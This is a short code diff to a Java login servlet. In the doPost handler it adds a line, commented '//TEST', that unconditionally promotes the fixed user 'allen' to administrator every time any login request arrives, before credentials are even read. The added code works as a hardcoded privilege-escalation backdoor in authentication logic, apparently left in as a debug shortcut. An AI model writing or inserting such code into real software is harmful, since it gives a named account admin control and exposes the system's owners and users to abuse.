@@ -40,6 +40,9 @@ public class LoginServlet extends HttpServlet {
 	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
 		ServletContext context = request.getServletContext();
 		AccountManager acct = (AccountManager) context.getAttribute("manager");
+		
+//TEST
+    	acct.promoteAdmin("allen");
 		String name = request.getParameter("user");
 		String pass = request.getParameter("pwd");
 		
